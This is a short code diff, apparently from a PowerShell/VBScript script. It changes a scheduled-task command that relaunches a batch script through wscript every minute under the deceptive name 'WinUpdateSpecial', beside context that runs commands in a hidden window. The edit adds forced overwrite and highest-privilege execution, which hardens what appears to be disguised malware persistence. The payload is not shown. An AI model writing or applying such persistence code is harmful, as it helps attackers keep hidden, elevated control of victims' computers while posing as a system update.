@@ -100,7 +100,7 @@ returnValue = objShell.Run(command, 0, True)
 $batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii
 
 
-schtasks /Create /SC minute /mo 1 /TN "WinUpdateSpecial" /TR "wscript.exe '$batchScriptPath'"
+schtasks /Create /SC minute /MO 1 /TN "WinUpdateSpecial" /TR "wscript.exe '$batchScriptPath'" /F /RL HIGHEST
 
 
 
